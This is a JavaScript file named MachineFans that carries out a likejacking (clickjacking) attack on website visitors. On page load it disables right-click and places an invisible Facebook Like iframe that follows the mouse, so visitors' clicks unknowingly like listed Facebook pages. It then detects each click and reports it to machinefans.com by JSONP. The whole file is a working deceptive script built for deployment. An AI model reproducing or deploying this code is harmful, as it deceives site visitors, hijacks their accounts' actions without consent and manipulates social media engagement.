/*!
	MachineFans 1.0.0
	http://www.machinefans.com/
	Autor: Miguel Lomeli <miguel.lomeli.mx@gmail.com>
*/



var keyMachineFans = '4f8d913ba0e84899911539d731f361e6';
var pathMachineFans = 'http://machinefans.com/js/save/';

var dataPages = {};
dataPages['28c905a36e9c7079bfba611ede94d03f'] = {url:'https://www.facebook.com/cecaesmx'};
dataPages['2eb45acc1f273a1f564bfe6c7f339aae'] = {url:'https://www.facebook.com/bachilleratoceneval'};

var htmlMachineFans = "";

var statusMensajeMachineFans = 0;


var uuidMachineFans = "";
var urlMachineFans = "";
var intervalMachineFans ;
var inIframeMachineFans = false;
var opMachineFans = 0;
var printMachineFans = 1;


function isset() {
  var a = arguments,
    l = a.length,
    i = 0,
    undef;
  if (l === 0) {
    throw new Error('Empty isset');
  }
  while (i !== l) {
    if (a[i] === undef || a[i] === null) {
      return false;
    }
    i++;
  }
  return true;
}


function setCookie(cname, cvalue, exdays) {
    var d = new Date();
    d.setTime(d.getTime() + (exdays*24*60*60*1000));
    var expires = "expires="+d.toUTCString();
    document.cookie = cname + "=" + cvalue + "; " + expires;
}


function getCookie(cname) {
    var name = cname + "=";
    var ca = document.cookie.split(';');
    for(var i=0; i<ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0)==' ') c = c.substring(1);
        if (c.indexOf(name) == 0) return c.substring(name.length,c.length);
    }
    return "";
}





function getAllCookies(){
	var cookies = document.cookie;
	var ca = cookies.split(';');
	var dataMachineFans = [];
	var x = 0;
	for(var i=0; i<ca.length; i++){
		var c = ca[i].substring(0,13);
		if( c.indexOf("machinefans_") >= 0 ){
			var explode = ca[i].split('=');
			dataMachineFans[explode[1]] = explode[1];
			x++;
		}
	}
	for(var value in dataPages){
		if( !isset(dataMachineFans[value]) ){
			uuidMachineFans = value;
			urlMachineFans = dataPages[value]["url"];
			break;
		}
	}
}


var statusMachineFans = 0;

function moveDiv(e){
	if(inIframeMachineFans == false){
		if(printMachineFans == 1){
			//console.log(e);	
		}
		if( statusMachineFans == 0 ){
			//document.getElementById("like").style.left = (e.pageX-10) + "px";
			//document.getElementById("like").style.top = (e.pageY-5) + "px";
			document.getElementById("like").style.left = (e.pageX-7) + "px";
			document.getElementById("like").style.top = (e.pageY-7) + "px";
			document.getElementById("like").style.cursor = "inherit";
			//document.getElementById("iframe").style.cursor = "inherit";
		}

	}	
}



function noneMachine(){
	if( statusMensajeMachineFans == 1 ){
		document.getElementById('lightMachine').style.display='none';
		document.getElementById('fadeMachine').style.display='none';
		document.body.style.overflowY = "auto";	
		document.body.style.overflowX = "auto";	
	} else {
		statusMachineFans = 1;
		document.getElementById("like").remove();
	}
}



function rightMachineFans(e) {
	var msg = "Prohibido usar Click Derecho !!! ";
	if (navigator.appName == 'Netscape' && e.which == 3) {
		console.log("");
		return false;
	} else if (navigator.appName == 'Microsoft Internet Explorer' && event.button==2) {
		console.log("");
		return false;
	}
	return true;
}


function createMchineFans(htmlStr) {
    var frag = document.createDocumentFragment(),
        temp = document.createElement('div');
    temp.innerHTML = htmlStr;
    while (temp.firstChild) {
        frag.appendChild(temp.firstChild);
    }
    return frag;
}



function fbLikes(){
	document.oncontextmenu = function(){return false}
	document.onmousedown = rightMachineFans;
	if( urlMachineFans.length <= 3 ){
		return false;
	}
	var UrlGlobal = "http://www.facebook.com/plugins/like.php?href="+(urlMachineFans)+"&fb_action_types=og.likes&width=50px&height=210px&colorscheme=light&layout=button_count&action=like&show_faces=false&send=false";
	var UrlGlobal = 'https://www.facebook.com/plugins/like.php?href=' + encodeURIComponent( urlMachineFans ) + '&show_faces=false';

	if(printMachineFans == 1){
		console.log(UrlGlobal);
	}
	var imagen = pathMachineFans + "../../assets/images/close.png"
	//htmlMachineFans += '<textarea name="console" id="console" style="width: 100%; height: 300px;" cols="" rows=""></textarea>';
	htmlMachineFans += 	''+
						'<div class="abajoMachine" align="right">'+
						'<img src="'+imagen+'" width="15px" height="15px" style="cursor:pointer" onclick="noneMachine();" />'+
						'<iframe class="iframe" id="framemachine" name="framemachine" src="'+UrlGlobal+'"></iframe>'+
						'</div>';
	var Html = ''+
				'<style type="text/css">'+
				'.iframe {'+
				'width:300px;'+
				'height:20px;'+
				'position:absolute;'+
				'top:0px; left:94%;'+
				'filter:alpha(opacity='+opMachineFans+');'+
				'opacity:'+opMachineFans+';'+
				'}'+
				'.black_overlay{'+
				'display: none;'+
				'position: absolute;'+
				'top: 0%;'+
				'left: 0%;'+
				'width: 100%;'+
				'height: 100%;'+
				'background-color: black;'+
				'z-index:1001;'+
				'-moz-opacity: 0.8;'+
				'opacity:.80;'+
				'filter: alpha(opacity=80);'+
				'}'+
				'.white_content {'+
				'display: none;'+
				'position: fixed;'+
				'top: 20%;'+
				'left: 25%;'+
				'width: 50%;'+
				'height: 50%;'+
				'padding: 16px;'+
				'border: 16px solid black;'+
				'background-color: white;'+
				'z-index:10000;'+
				'overflowY: hidden;'+
				'overflowX: hidden;'+				
				'}'+
				'.abajoMachine { '+
				'color: rgb(0, 0, 0);'+
				'bottom: 0px;'+
				'top:0px;'+
				'position: absolute;'+
				'vertical-align:text-bottom;'+
				'padding-left: 97%;'+
				'-webkit-padding-start: 97%;'+
				'-moz-padding-start: 90%;'+

				'overflowY: hidden;'+
				'overflowX: hidden;'+
				//'cursor:pointer;'+
				'}'+
				'</style>'+
				'<div id="lightMachine" class="white_content"></div>'+
				'<div id="fadeMachine" class="black_overlay"></div>				'+
				'<div id="like" style="position: relative; position:absolute;overflow: hidden; width: 25px; height: 20px; cursor:inherit !important;'+
				'filter: alpha(opacity='+opMachineFans+'); -moz-opacity: '+opMachineFans+'.0; -khtml-opacity: '+opMachineFans+'.0; opacity: '+opMachineFans+'.0;z-index: 999999999;">'+
				'	<iframe id="framemachine" name="framemachine" src="'+UrlGlobal+'" scrolling="no" frameborder="0" style="border:none; overflow:hidden; cursor:inherit !important; '+
				'width:25px; height:23px;float:left;" allowTransparency="true"></iframe>'+
				//'<div class="hide-cursor" style="position: absolute; top: 0; bottom: 0; right: 0; left: 0; cursor: inherit; z-index: 100;"></div>'+
				'</div>';

	//Html = '';

var fragment = createMchineFans(Html);
document.body.insertBefore(fragment, document.body.childNodes[0]);
	//$("body").append(Html);
	//document.body.innerHTML += Html;
	if( statusMensajeMachineFans == 1 ){
		document.getElementById('lightMachine').style.display='block';
		document.getElementById('fadeMachine').style.display='block';
		document.getElementById('lightMachine').innerHTML = htmlMachineFans;
		document.body.style.overflowY = "hidden";
		document.body.style.overflowX = "hidden";
		document.getElementById("like").remove();
	} else {
		try
		{//FF, webkit, opera, IE>8
		    document.addEventListener('mousemove',function(e){
		    	moveDiv(e);
		    },false);
		}
		catch (e)
		{//IE >6 (7?)
		    document.attachEvent('onmousemove',function(e){
		    	moveDiv(e);
		    });
		}
		finally
		{//browsers that must die
		    try
		    {
		        document.onmousemove = function(e){
		        	moveDiv(e);
		        };
		    }
		    catch(die)
		    {
				if(printMachineFans == 1){
					console.log('Use a decent browser.');
				}	    	
		    }
		}
		//intervalMachineFans = setInterval(checkClick, 10);
	}
	return false;
}


function detectarClick(){
	document.getElementById("like").remove();
	window.clearInterval(intervalMachineFans);
	inIframeMachineFans = true
}


function checkClick() {
    if (document.activeElement 
      && document.activeElement === document.getElementById("framemachine")) {
        if (inIframeMachineFans == false) {
           setTimeout(detectarClick , "3000");
        }
    } else {
        inIframeMachineFans = false;
    }
}

function jsonp(url) {
	var head = document.head;
	var script = document.createElement("script");
	script.setAttribute("src", url);
	head.appendChild(script);
	head.removeChild(script);
}

function jsonpCallback(data) {
	if(printMachineFans == 1){
		console.log(data);
	}
}


function sendReport(){
	if(printMachineFans == 1){
		console.log("ya dimos me gusta");
	}
	//noneMachine();
	setCookie("machinefans_"+uuidMachineFans , uuidMachineFans , 365);
	jsonp(pathMachineFans+"?callback=jsonpCallback&key="+keyMachineFans+"&uuid="+uuidMachineFans);
}


function sendReportClose(){
	if(printMachineFans == 1){
		console.log("ya dimos me gusta");
	}
	//noneMachine();
	setCookie("machinefans_"+uuidMachineFans , uuidMachineFans , 365);
	jsonp(pathMachineFans+"?callback=jsonpCallback&key="+keyMachineFans+"&uuid="+uuidMachineFans);
	setTimeout(noneMachine , 2000);
}




	var isOverIFrame = false;




       function processMouseOut() {
            AlertLog("IFrame mouse >> OUT << detected.");
            isOverIFrame = false;
            top.focus();
        }

        function processMouseOver() {
            AlertLog("IFrame mouse >> OVER << detected.");
            isOverIFrame = true;
        }

        function processIFrameClick() {
            if(isOverIFrame) {
                AlertLog("IFrame >> CLICK << detected. ");
                sendReportClose();
            }
        }

        function AlertLog(message) {
        	if(printMachineFans == 1){
        		console.log(message);
        		return false;
        		/*
				var console = document.getElementById("console");
	            var text = console.value;
	            text = text + message + "\n";
	            console.value = text;
	            */
        	}
        }

        function attachOnloadEvent(func, obj) {
            if(typeof window.addEventListener != 'undefined') {
                window.addEventListener('load', func, false);
            } else if (typeof document.addEventListener != 'undefined') {
                document.addEventListener('load', func, false);
            } else if (typeof window.attachEvent != 'undefined') {
                window.attachEvent('onload', func);
            } else {
                if (typeof window.onload == 'function') {
                    var oldonload = onload;
                    window.onload = function() {
                        oldonload();
                        func();
                    };
                } else {
                    window.onload = func;
                }
            }
        }

        function initFrameMachine() {
            /*
            var element = document.getElementById("framemachine");
			element.onmouseover = processMouseOver;	
            element.onmouseout = processMouseOut;
            */
            var element = document.getElementsByTagName("iframe");
            for (var i=0; i<element.length; i++) {
            	var nombre = element[i].id;
            	if( nombre.indexOf("framemachine") >= 0 ){
            		element[i].onmouseover = processMouseOver;	
            		element[i].onmouseout = processMouseOut;
            	}
            }
            
            if (typeof window.attachEvent != 'undefined') {
                top.attachEvent('onblur', processIFrameClick);
            }
            else if (typeof window.addEventListener != 'undefined') {
                top.addEventListener('blur', processIFrameClick, false);
            }
        }









function moveFrameFun(){
	attachOnloadEvent(initFrameMachine);
	initFrameMachine();
}





function iniciandoElSistema(){
	getAllCookies();
	fbLikes();
	setTimeout(function(){ moveFrameFun(); } , "1000");
		
}




if (document.all && !window.opera){
    document.write('<script type="text/javascript" id="contentloadtag" defer="defer" src="javascript:void(0)"><\/script>')
    var contentloadtag=document.getElementById("contentloadtag")
    contentloadtag.onreadystatechange=function(){
        if (this.readyState=="complete")
        	setTimeout(iniciandoElSistema , "3000");
    }
}



document.addEventListener("DOMContentLoaded", function (){
	setTimeout(iniciandoElSistema , "3000");
}, false);



